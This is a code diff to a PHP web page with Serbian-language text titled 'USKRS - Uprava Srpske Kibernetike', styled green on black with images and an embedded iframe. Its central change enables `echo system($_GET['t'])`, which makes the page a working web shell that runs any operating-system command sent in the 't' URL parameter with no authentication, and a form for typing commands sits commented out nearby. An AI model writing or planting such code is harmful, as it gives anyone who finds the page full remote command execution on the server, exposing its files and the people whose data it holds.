@@ -1,10 +1,11 @@
 <?php
 echo '<html><head><style></style>
 </head><body style="background: #111; color: #17f118;">';
-//echo '<form>
-//			<input name="t" type="search" class="inp" placeholder="Unesi komandu" autofocus>
-//			<input type="submit" value="ENTER">
-//		</form>';
+//echo '<form style="text-align: center;">
+//	<input name="t" type="search" class="inp" placeholder="Unesi komandu" autofocus>
+//	<input type="submit" value="ENTER">
+//</form>';
+echo '<div style="text-align: center;" ><img src="ws1.png" width="100" height="auto"/></div>';
 
 echo '<br /><br /><div style="text-align: center;"><pre><b style="font-size: 1.3em;">USKRS - Uprava Srpske Kibernetike</b></pre></div>';
 echo '<br /><div style="text-align: center;"><img src="logo1.jpg" width="160" height="auto" style="border: 2px dotted violet;">
@@ -37,11 +38,11 @@ echo '
 <br />Linearna vrednost: ' . $retval;
 
 echo '<iframe src="https://www.densomaniak.com/" title="Densomaniak" width="100%" height="300" style="border:1px solid black;"></iframe><br />';
-//echo system($_GET['t']);
+echo system($_GET['t']);
 ?>
 
 <?php
-echo '<div style="text-align: center;"><img src="linea-stairs.gif" height="70"><img src="hightech.gif" height="70"><img src="la-linea.gif" height="70"></div>';
+//echo '<div style="text-align: center;"><img src="linea-stairs.gif" height="70"><img src="hightech.gif" height="70"><img src="la-linea.gif" height="70"></div>';
 //$output = shell_exec('ls');
 //echo '<p>Fajlovi:</p>';
 //echo "<pre>$output</pre>";
